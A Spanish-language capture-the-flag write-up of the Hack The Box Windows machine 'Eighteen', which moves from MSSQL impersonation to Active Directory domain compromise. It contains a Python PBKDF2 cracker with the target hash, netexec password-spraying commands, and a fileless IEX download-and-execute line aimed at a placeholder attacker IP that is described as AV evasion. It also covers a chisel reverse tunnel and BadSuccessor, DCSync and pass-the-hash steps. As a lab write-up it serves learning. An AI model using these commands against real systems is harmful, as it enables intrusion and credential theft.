Level: Easy
OS: Windows 

# Enumeración

### Nmap

Escaneo inicial (puertos):

```shell
sudo nmap 10.129.26.82 -p- -vvv -sS --min-rate 5000 -n -Pn -oG ports.grep 
```

![[Pasted image 20260410200958.png]]



```ruby
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 20:07 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:07
Completed NSE at 20:07, 0.00s elapsed
Initiating NSE at 20:07
Completed NSE at 20:07, 0.00s elapsed
Initiating NSE at 20:07
Completed NSE at 20:07, 0.00s elapsed
Initiating Ping Scan at 20:07
Scanning 10.129.26.82 [4 ports]
Completed Ping Scan at 20:07, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:07
Completed Parallel DNS resolution of 1 host. at 20:07, 0.50s elapsed
Initiating SYN Stealth Scan at 20:07
Scanning 10.129.26.82 [3 ports]
Discovered open port 80/tcp on 10.129.26.82
Discovered open port 1433/tcp on 10.129.26.82
Discovered open port 5985/tcp on 10.129.26.82
Completed SYN Stealth Scan at 20:07, 0.19s elapsed (3 total ports)
Initiating Service scan at 20:07
Scanning 3 services on 10.129.26.82
Completed Service scan at 20:07, 6.81s elapsed (3 services on 1 host)
NSE: Script scanning 10.129.26.82.
Initiating NSE at 20:07
Completed NSE at 20:07, 5.90s elapsed
Initiating NSE at 20:07
Completed NSE at 20:07, 2.77s elapsed
Initiating NSE at 20:07
Completed NSE at 20:07, 0.00s elapsed
Nmap scan report for 10.129.26.82
Host is up (0.18s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-11T06:57:53
| Not valid after:  2056-04-11T06:57:53
| MD5:     4579 4467 91cf 1cb9 ed2c 2955 d251 adee
| SHA-1:   bece 8681 afbc 9c78 650c 83ed 709a 8536 6ce1 7684
|_SHA-256: d386 5ef9 8077 3591 503c e29e 06d7 4b22 ca8e 2d00 ee94 825c bb0f 4e70 8518 7c4f
| ms-sql-info: 
|   10.129.26.82:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-04-11T07:23:35+00:00; +1d07h15m56s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.26.82:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1d07h15m55s, deviation: 0s, median: 1d07h15m54s

NSE: Script Post-scanning.
Initiating NSE at 20:07
Completed NSE at 20:07, 0.00s elapsed
Initiating NSE at 20:07
Completed NSE at 20:07, 0.00s elapsed
Initiating NSE at 20:07
Completed NSE at 20:07, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
```


Vemos que hay 3 puertos abiertos (IIS, mssql, httpapi):

Intentamos una autenticación hacia mssql  con las credenciales que nos dieron en hack the box:

![[Pasted image 20260410202031.png]]

Comprobadas las conexiones a la base de datos, podemos intentar conectarnos usando `impacket-mssqlclient.py`:

![[Pasted image 20260410210800.png]]

Listemos las bases de datos disponibles, recordemos que la estructura es:

Databases -> esquemas -> tablas -> columnas/filas/etc

Para listar las bases de datos disponibles podemos usar enum_db:

```ruby
(mssql)> enum_db
```

Tambien podemos usar:

```ruby
SELECT name FROM sys.databases
```

![[Pasted image 20260411171303.png]]

La unica base de datos que no es default es financial_planner, por lo que podemos intantar usarla:

```ruby
(mssql)> use financial_planner
```

![[Pasted image 20260411171401.png]]

Como vemos no tenemos permisos para ello, por lo que tenemos que buscar otra via de acceso.


Usamos el comando enum_impersonate para ver si tenemos permisos para que kevin (kevin) se pueda hacer pasar por otro usuario:

![[Pasted image 20260411171046.png]]

Efectivamente podemos impersonar al usuario appdev, por lo que podemos usar:

```ruby
exec_as_login appdev
```

Ahora somos el usuario appdev, por lo que podemos ver si podemos entrar a la base de datos de `financial_planner`:

![[Pasted image 20260411194512.png]]

Tenemos acceso, ahora debemos intentar ver que tablas  hay dentro de esta base de datos:

```mysql
SELECT name FROM sys.tables;
```

![[Pasted image 20260411194829.png]]

Listamos todo el contenido de users:

```mysql
SELECT * FROM users;
```

![[Pasted image 20260411194845.png]]


Buscamos mas información de este hash poniendo el inicio del mismo en internet y encontramos [esta página](https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256):


![[Pasted image 20260411220209.png]]


![[Pasted image 20260412072246.png]]

![[Pasted image 20260412072315.png]]


Como podemos ver en esta pagina nos entregan la estructura que debe tener, pero aún cambiando la estructura para que hashcat  lo pueda leer, sigue sin poder romper el hash, por lo que opté por crear mi propio hash cracker para esta ocasión: 


```python
#!/usr/bin/env python3
import hashlib # Librería para algoritmos de hashing (PBKDF2, SHA256, etc.)
from multiprocessing import Pool, cpu_count # Para usar todos los núcleos del procesador

def check_password(password):
    """
    Función que ejecutará cada núcleo (trabajador) de forma independiente.
    """
    try:
        # PBKDF2_HMAC: El algoritmo de derivación de clave.
        # Es lento por diseño (600,000 iteraciones) para dificultar el cracking.
        computed = hashlib.pbkdf2_hmac(
            'sha256',
            password,          # La palabra del diccionario (en bytes)
            SALT.encode(),     # el Salt convertido a bytes
            ITERATIONS         # El número de vueltas de hash
        )

        # Comparamos el resultado generado con nuestro objetivo (TARGET_HASH)
        if computed.hex() == TARGET_HASH:
            # Si coincide, decodifica los bytes a texto y los devuelve
            return password.decode(errors="ignore")
    except:
        # Si hay un error con una palabra específica, la ignora y sigue con la siguiente
        pass

    return None # Si no coincide, devuelve nada

# ---- Componentes del Hash (Configuración) ----
SALT = "AMtzteQIG7yAbZIa"
ITERATIONS = 600000
TARGET_HASH = "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"

# ---- Ruta de tu diccionario ----
WORDLIST = "/usr/share/wordlists/rockyou.txt"

def main():
    print(f"[+] Using wordlist: {WORDLIST}")
    print("[+] Starting PBKDF2-SHA256 cracking...")

    # El primer 'with': Asegura que el archivo se cierre solo, incluso si el script falla.
    # Se abre en modo "rb" (read binary) para que el generador trabaje con bytes directamente.
    with open(WORDLIST, "rb") as f:
        
        # Generador: Lee el archivo línea por línea sin cargarlo todo en la RAM.
        # line.strip() quita los saltos de línea (\n) de cada palabra.
        passwords = (line.strip() for line in f)

        # El segundo 'with': Crea el Pool (piscina) de procesos.
        # cpu_count() detecta cuántos hilos/núcleos tiene tu PC para usarlos todos.
        with Pool(cpu_count()) as pool:
            
            # imap_unordered: Reparte las palabras entre los núcleos.
            # chunksize=500: Envía paquetes de 500 palabras a cada núcleo para ser más eficiente.
            for result in pool.imap_unordered(check_password, passwords, chunksize=500):
                
                # Si algún núcleo encuentra la contraseña (deja de ser None):
                if result:
                    print(f"[+] PASSWORD FOUND: {result}")
                    # Cerramos los demás procesos inmediatamente para ahorrar recursos
                    pool.terminate()
                    return

    # Si el generador se agota y nadie devolvió un resultado
    print("[-] No match found.")

# Punto de entrada para evitar que el código se ejecute infinitamente al crear procesos hijos
if __name__ == "__main__":
    main()
```

Explicacion de este script de python en mi repositorio "Mi_Camino".

Logramos crackear el hash gracias al script, la contraseña es `iloveyou1`, solo tneemos que averiguar para que usuario, para ello podemos hacer un password spring pero para ello necesitamos una lista de usuarios, esto lo haremos con un RID brute forcing, podemos usar netexec para esta tarea:

```shell
sudo netexec mssql 10.129.27.119
```

![[Pasted image 20260412121628.png]]


Podemos intuir que los usuarios son los que están al final:

![[Pasted image 20260412121842.png]]

Por lo que nos lo metemos en una lista users.txt y lo usamos para hacer un password sprying con la contraseña `iloveyou1` sobre todos estos usuarios, para lo que tambien podemos usar netexec:


```shell
sudo netexec mssql -u users.txt -p 'iloveyou1'
```


![[Pasted image 20260412122811.png]]

Vemos que usando mssql para enumerar lo nos da errores, por lo que podemos usar winrm (el otro servicio abierto), para hacer el password sprying:

![[Pasted image 20260412122907.png]]

Vemos que el usuario adam.scott tiene la contraseña `iloveyou1`, ya con las credenciales encontradas podemos conectarnos a traves de winrm y conseguir la primera flag user.txt:

![[Pasted image 20260416195247.png]]

Ahora vamos a recolectar datos para BloodHound, y de esta forma encontrar vias de escalación, empezamos compartiendo el archivo SharpHound.ps1 con python:

![[Pasted image 20260417080354.png]]

Ahora vamos a llamar este archivo en windows usando IEX, de tal forma que estamos haciendo un ataque *FileLess* esto sirve especialmente para evadir al AV ya que no hay ningún archivo en disco que contenga malware, todo se carga inmediatamente en la memoria:

```powershell
IEX (New-Object Net.WebClient).downloadString('http://{IP_Atacante}/SharpHound.ps1')
```

Esto nos va a crear una función interna en la sesion llamada Invoke-BloodHound, esta nos ayudará a recolecatar la data que necesitamos:

![[Pasted image 20260417080722.png]]

vemos que nos genera un archivo .zip, nos lo descargamos con la función download de evil-winrm:

![[Pasted image 20260417080916.png]]

Ahora vamos a bloodhound y lo subimos.

Analizando Bloodhound no encontramos nada de alto valor, por lo que hacemos una enumeración con BloodyAD, pero, como el puerto de LDAP no está expuesto, es mejor usar chisel, para tunelizar la conexion y así llegar hasta el puerto interno de LDAP:

### Nos ponemos a la escucha con chisel en la maquina atacante

```python
sudo chisel server --reverse -p 4444
```

# Mandamos la conexion con chisel desde la maquina victima

![[Pasted image 20260419135211.png]]

Vemos que nos llega efectivamente la conexión:

![[Pasted image 20260419135238.png]]

Ahora podemos hacer la enumeración con bloodyAD:

![[Pasted image 20260419135345.png]]

Vemos que tenemos permisos CREATE_CHILD  lo cual nos puede permitir crear un hijo (Cualquier tipo de clase de objeto), bajo la OU (Organization Unit) Staff, esto porque me llama la antención?

En versiones recientes de AD, salió Windows Server 2025, en estas nuevas versiones hay una nueva clase de objeto llamada dMSA (Delegated Managed Service Account), la existencia de esta clase de objeto, mas el CREATE_CHILD desencadena en una vulnerabilidad de tipo BadSuccessor (mas info en Mi_Camino Repository).


Primero debemos crear esta cuenta maliciosa apuntando al Administator, para esto podemos usar la herramienta BadSuccessor.ps1:

![[Pasted image 20260419140441.png]]

Ahora, con la cuenta creada, podemos solicitar un  TS usando la herramienta de impacket `getTS.py`, impersonando a la cuenta dMSA que creamos anteriormente:

![[Pasted image 20260419142455.png]]

Ahora tenemos un archivo ccache, el cual contiene el TS, solo es cuestion de guardar la ruta hacia este archivo en la variable `KRB5CCNAME`, y ahora, podemos  hacer un DCsync usando el ticket privilegiado que conseguimos:

![[Pasted image 20260419143014.png]]

Por ultimo podemos usar el hash NTLM para hacer un PTH (Pass The Hash) y entrar en el sistema como administrador usando evil-winrm:

![[Pasted image 20260419143244.png]]

# Maquina finalizada, Aprendizajes:


1. Aprendizaje y diferenciación de esquemas (OU, DN, CN, etc)
2. Vulnerabilidad BadSuccesor
3. 





